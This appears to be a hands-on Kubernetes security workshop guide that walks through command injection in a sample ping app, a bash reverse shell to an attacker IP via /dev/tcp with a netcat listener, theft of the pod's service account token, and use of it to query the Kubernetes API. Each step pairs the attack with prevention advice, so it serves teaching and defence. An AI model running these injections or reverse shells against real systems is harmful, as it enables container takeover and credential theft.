# Hijack Kubernetes Hands-on

## Play with the sample app

The sample app "ping me" pings a destination provided via the input field. Try the folloing inputs:

```bash
127.0.0.1

127.0.0.1; echo "I was here"

; which bash
```

<details>
<summary>Details on how to input the snippets</summary>

1. Let's try to inject a command after the IP address: `127.0.0.1; echo "I was here"`. As you see in the responce it worked.
2. Now we try whether `bash` is available: `; which bash`. And it is! Looks like we could try to hijack the container.

</details>

<details>
<summary>How to prevent this attack</summary>

* Shift security left and enable [SAST scanning](https://owasp.org/www-community/Source_Code_Analysis_Tools)
* Build secure/small container images ([distroless](https://github.com/GoogleContainerTools/distroless), less is more)

</details>

## Hijack the container

We now inject into the container via a reverse shell. Try the following:

On your attacker machine:

```bash
sudo nc -lnvp 80
```

Input for the app (change your IP):

```bash
; bash -c 'bash -i >& /dev/tcp/0.0.0.0/80 0>&1'
```

<details>
<summary>Details on how to hijack the container</summary>

1. We will open a connection on our attacker machine using netcat: `sudo nc -lnvp 80`
2. Now we inject the required command into our container. This allow us to connect a reverse shell to our open connection: `; bash -c 'bash -i >& /dev/tcp/20.86.25.78/80 0>&1'`.
3. And finally, we have a reverse shell up and running. Try some commands like `ls`

</details>

<details>
<summary>How to prevent this attack</summary>

* Build secure/small container images ([distroless](https://github.com/GoogleContainerTools/distroless), less is more)
* Deny egress network access on a network level as well as using [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)

</details>

## Get access to the Kubernetes API

Let's see if we can access the API Server. Execute the following snippets:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api

NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api/v1/namespaces/$NS/pods

curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/

kubectl get pods
kubectl get pods -A
kubectl get nodes

kubectl auth can-i create pod
```

<details>
<summary>Details on how to access the Kubernetes API server</summary>

Let's see if we can access the API Server.
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api
```

It looks like we were able to authenticate and do have some access. Let's try whether we have access to see other pods in our namespace:

``` bash
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api/v1/namespaces/$NS/pods
```

This looks good! Let's install `kubectl` for easier access:

```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/
```

Let's see what we are allowed to do:

```bash
kubectl get pods
kubectl get pods -A
kubectl get nodes

kubectl auth can-i create pod
```

</details>

<details>
<summary>How to prevent this attack</summary>

* Do not share service accounts between applications
* Do not enable higher access levels for the default service account (this app would not have needed it!)
* Review all third-party snippets before deploying them
* Use read-only filesystems
* Deny running root containers (Tools like [OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper) and [Kyverno](https://github.com/kyverno/kyverno) can help)
* Things we already talked about
  * Limit egress access to the internet
  * Use distroless and secure container images

</details>
